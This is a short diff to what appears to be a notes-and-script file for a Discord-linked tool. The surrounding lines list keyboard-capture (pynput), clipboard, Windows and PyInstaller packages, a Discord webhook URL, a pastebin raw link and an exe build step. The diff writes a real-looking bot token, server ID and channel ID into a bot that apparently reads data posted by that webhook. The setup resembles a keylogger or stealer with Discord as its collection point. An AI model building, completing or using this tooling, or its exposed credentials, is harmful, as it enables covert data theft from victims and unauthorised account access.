@@ -2,6 +2,12 @@ pip install requests pillow pynput cryptography pywin32 pyinstaller pyperclip di
 
 https://discord.com/api/webhooks/1453461921733939202/NpZz8x6PQZsh9GmJUIpPT4hK12PJEOm8V0y23nRTtBBbvdk_5c4iin076WJK3srQN2Px
 
+MTQ1MzQ4Njg3ODk3MDg3MTk3Mg.GNf9Mg.mhHpluLYh-FZN5lKmtbMMSrP0ZvMgZtJQFa1HQ
+
+server id = 1264299849063333919
+
+Channel id = 1278004169134837770
+
 https://pastebin.com/raw/m5U6eger
 
 
@@ -175,9 +181,9 @@ print(f"EXE ready: dist\\{output_name}")
 import discord
 import re
 
-TOKEN = "YOUR_BOT_TOKEN"
-GUILD_ID = 123456789012345678  # Server ID
-LOG_CHANNEL_ID = 987654321098765432  # Channel where webhook posts
+TOKEN = "MTQ1MzQ4Njg3ODk3MDg3MTk3Mg.GNf9Mg.mhHpluLYh-FZN5lKmtbMMSrP0ZvMgZtJQFa1HQ"
+GUILD_ID = 1264299849063333919  # Server ID
+LOG_CHANNEL_ID = 1278004169134837770  # Channel where webhook posts
 
 intents = discord.Intents.default()
 intents.message_content = True
